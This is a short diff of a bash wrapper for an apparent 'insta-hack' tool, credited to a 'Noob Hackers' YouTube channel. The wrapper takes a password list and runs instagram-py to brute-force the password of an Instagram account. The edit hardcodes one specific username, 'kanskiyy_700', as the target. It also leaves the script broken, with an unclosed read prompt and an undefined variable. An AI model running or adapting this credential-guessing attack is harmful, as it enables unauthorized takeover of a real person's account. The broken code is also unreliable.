@@ -22,7 +22,7 @@ printf "\n"
 printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 echo
-read -p "[#] User Name : " usrnm
+read -p "[#] User Name : kanskiyy_700
 echo
 read -p "[#] Enter Passlist Location : " inspass
 echo
@@ -30,7 +30,7 @@ if [[ $inspass = 0 ]]
 then
 echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
 else
-instagram-py --username $usrnm --password-list $inspass
+instagram-py --username $kanskiyy_700 --password-list $inspass
 echo
 cd $HOME/insta-hack
 fi
